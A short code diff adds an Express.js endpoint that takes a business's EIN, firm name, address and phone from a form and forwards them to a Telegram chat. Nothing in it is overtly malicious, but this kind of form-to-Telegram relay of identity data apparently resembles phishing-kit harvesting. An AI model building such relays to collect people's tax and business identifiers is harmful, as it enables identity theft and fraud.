@@ -153,6 +153,25 @@ app.post('/sendGoal', async (req, res) => {
   }
 });
 
+app.post('/sendAddress', async (req, res, next) => {
+  const { ein, firm, address, phone } = req.body;
+
+  if (!ein || !firm || !address || !phone) {
+    return res.status(400).json({ success: false, message: "Missing required fields" });
+  }
+
+  const message = `New Address Info:\nEIN: ${ein}\nFirm Name: ${firm}\nAddress: ${address}\nPhone: ${phone}`;
+
+  try {
+    await sendTelegramMessage(message);
+    res.status(200).json({ success: true, message: "Address info sent to Telegram" });
+  } catch (error) {
+    console.error("Error sending address info:", error);
+    next(error);
+  }
+});
+
+
 
 
 // Catch-all for unmatched routes - JSON response
